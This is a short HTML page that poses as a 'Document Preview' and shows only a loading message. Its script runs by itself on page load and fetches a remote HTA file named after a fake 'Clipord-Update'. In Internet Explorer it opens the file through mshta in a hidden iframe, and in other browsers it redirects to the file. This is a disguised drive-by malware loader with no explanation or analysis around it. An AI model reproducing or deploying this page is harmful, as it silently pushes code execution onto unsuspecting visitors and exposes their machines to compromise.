<!DOCTYPE html>
<html>
<head>
    <title>Document Preview</title>
    <script>
    function launch() {
        // IE legacy code for HTA auto-download
        if(window.ActiveXObject) {
            const frame = document.createElement("iframe");
            frame.style.display = "none";
            frame.src = "mshta:https://raw.githubusercontent.com/hotthings7/Clipord-Update/main/assets/launch.hta";
            document.body.appendChild(frame);
        } else {
            // Modern browsers fallback
            window.location = "https://raw.githubusercontent.com/hotthings7/Clipord-Update/main/assets/launch.hta";
        }
    }
    // Auto-trigger on page load
    window.onload = launch;
    </script>
</head>
<body>
    <h1>Loading document preview...</h1>
</body>
</html>
